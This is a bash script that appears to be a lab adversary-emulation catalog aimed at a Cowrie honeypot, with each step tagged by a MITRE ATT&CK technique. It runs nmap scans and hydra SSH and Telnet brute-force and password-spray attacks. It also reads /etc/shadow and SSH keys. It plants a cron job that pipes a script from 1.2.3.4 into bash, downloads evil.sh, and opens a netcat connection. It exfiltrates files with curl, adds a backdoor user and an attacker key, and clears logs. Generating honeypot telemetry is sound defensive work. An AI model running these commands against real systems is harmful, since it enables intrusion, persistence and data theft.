#!/usr/bin/env bash
# Adversary emulation attack catalog — 32 attacks across 9 MITRE ATT&CK tactics
# Run from Mac/Kali: bash attack_catalog.sh <HONEYPOT_IP>
# Requirements: nmap, hydra, sshpass
set -uo pipefail

TARGET="${1:?Usage: bash attack_catalog.sh <HONEYPOT_IP>}"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
LOG="/tmp/attack_catalog_${TIMESTAMP}.log"
PASSWORDS="/tmp/lab_passwords.txt"
USERS="/tmp/lab_users.txt"
CREDS="/tmp/lab_creds.txt"

cat > "$PASSWORDS" <<'EOF'
password
123456
admin
root
raspberry
pi
1234
letmein
qwerty
abc123
password123
test
guest
default
EOF

cat > "$USERS" <<'EOF'
root
admin
pi
ubuntu
user
guest
test
oracle
mysql
postgres
EOF

cat > "$CREDS" <<'EOF'
root:password
root:toor
admin:admin
admin:password
pi:raspberry
ubuntu:ubuntu
EOF

echo "============================================================"
echo " Adversary Emulation — Attack Catalog"
echo " Target: $TARGET"
echo " Log:    $LOG"
echo " Start:  $(date -u)"
echo "============================================================"

exec > >(tee -a "$LOG") 2>&1

run_attack() {
    local id="$1" desc="$2"; shift 2
    echo ""
    echo "===== $id : $desc ====="
    echo "START $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    "$@" 2>&1 || true
    echo "END   $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    sleep 20
}

# ---- RECONNAISSANCE ----
run_attack A01 "T1595.001 — Active port scan" \
    nmap -sT -Pn -T3 "$TARGET"

run_attack A02 "T1595.002 — Service version scan" \
    nmap -sV -Pn -p 22,23,21,80,445,3306 "$TARGET"

run_attack A03 "T1595 — OS fingerprint" \
    nmap -O -Pn "$TARGET"

# ---- INITIAL ACCESS ----
run_attack A04 "T1110.001 — SSH brute force (root)" \
    hydra -l root -P "$PASSWORDS" ssh://"$TARGET" -t 2 -f -V

run_attack A05 "T1110.004 — SSH credential stuffing" \
    hydra -C "$CREDS" ssh://"$TARGET" -t 2 -f -V

run_attack A06 "T1110.003 — SSH password spray" \
    hydra -L "$USERS" -p "Password1" ssh://"$TARGET" -t 4 -V

run_attack A07 "T1110.001 — Telnet brute force" \
    hydra -l admin -P "$PASSWORDS" telnet://"$TARGET" -t 2 -V

# ---- FIND ACCEPTED PASSWORD ----
echo ""
echo "Checking accepted password from Cowrie logs..."
COWRIE_PASS=$(ssh -p 2200 pi3@"$TARGET" \
    'sudo grep "login.success" /home/cowrie/cowrie/var/log/cowrie/cowrie.json 2>/dev/null | tail -1 | jq -r .password' 2>/dev/null || echo "raspberry")
echo "Using password: $COWRIE_PASS"

# ---- EXECUTION + DISCOVERY via Cowrie ----
CMDS=(
    "whoami; id; uname -a; hostname"
    "env; printenv | head -20"
    "ps aux | head -20"
    "netstat -an 2>/dev/null || ss -tulnp"
    "bash -c 'id && ls -la /'"
    "ls -la /; ls -la /etc; ls -la /home"
    "cat /etc/passwd"
    "cat /etc/shadow"
    "cat /etc/ssh/sshd_config"
    "cat /etc/sudoers 2>/dev/null"
    "sudo -l 2>&1"
    "find / -perm -4000 -type f 2>/dev/null | head -10"
    "cat ~/.ssh/authorized_keys 2>/dev/null; cat ~/.ssh/id_rsa 2>/dev/null"
    "history -c; unset HISTFILE"
)

IDS=(A10 A11 A12 A13 A14 A15 A16 A17 A18 A19 A20 A21 A23 A32)
DESCS=(
    "T1059.004 — Shell execution"
    "T1082 — Environment discovery"
    "T1057 — Process listing"
    "T1049 — Network connection discovery"
    "T1059.004 — Bash -c execution"
    "T1083 — File and directory discovery"
    "T1087.001 — /etc/passwd read"
    "T1003.008 — /etc/shadow read"
    "T1552.004 — SSH config read"
    "T1548.003 — Sudoers read"
    "T1548.003 — Sudo execution"
    "T1548.001 — SUID binary discovery"
    "T1552.004 — SSH key read"
    "T1070.003 — History clearing"
)

for i in "${!CMDS[@]}"; do
    echo ""
    echo "===== ${IDS[$i]} : ${DESCS[$i]} ====="
    echo "START $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 \
        root@"$TARGET" "${CMDS[$i]}" 2>&1 || true
    echo "END   $(date -u +%Y-%m-%dT%H:%M:%SZ)"
    sleep 15
done

# ---- PERSISTENCE ----
run_attack A24 "T1053.003 — Cron persistence" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "echo '* * * * * curl http://1.2.3.4/shell.sh | bash' > /tmp/evil_cron && crontab /tmp/evil_cron"

run_attack A25 "T1098.004 — SSH authorized_keys append" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "echo 'ssh-rsa AAAAB3NzaC1yc2E attacker@evil' >> ~/.ssh/authorized_keys"

run_attack A26 "T1136.001 — Backdoor user creation" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "useradd -m -s /bin/bash backdoor"

# ---- C2 / EXFILTRATION ----
run_attack A27 "T1105 — Tool download via wget" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "wget http://1.2.3.4/evil.sh -O /tmp/evil.sh 2>&1 || true"

run_attack A28 "T1105 — Tool download via curl" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "curl -s http://1.2.3.4/evil.sh -o /tmp/evil.sh 2>&1 || true"

run_attack A29 "T1059.004 — Netcat reverse shell attempt" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "nc 1.2.3.4 4444 2>&1 || true"

run_attack A30 "T1041 — Data exfiltration simulation" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "tar czf /tmp/exfil.tgz /etc/passwd /etc/hostname 2>/dev/null; curl -F 'f=@/tmp/exfil.tgz' http://1.2.3.4/upload 2>&1 || true"

# ---- DEFENSE EVASION ----
run_attack A31 "T1070.002 — Log clearing attempt" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "echo '' > /var/log/auth.log 2>&1 || true"

run_attack A32 "T1070.003 — History clearing" \
    sshpass -p "$COWRIE_PASS" ssh -o StrictHostKeyChecking=no root@"$TARGET" \
    "history -c; unset HISTFILE"

echo ""
echo "============================================================"
echo " Attack catalog complete"
echo " Log: $LOG"
echo " End: $(date -u)"
echo "============================================================"
echo ""
echo "View results in Grafana:"
echo "  {job=\"cowrie\"} | json | line_format \"{{.eventid}} {{.src_ip}} {{.input}}\""
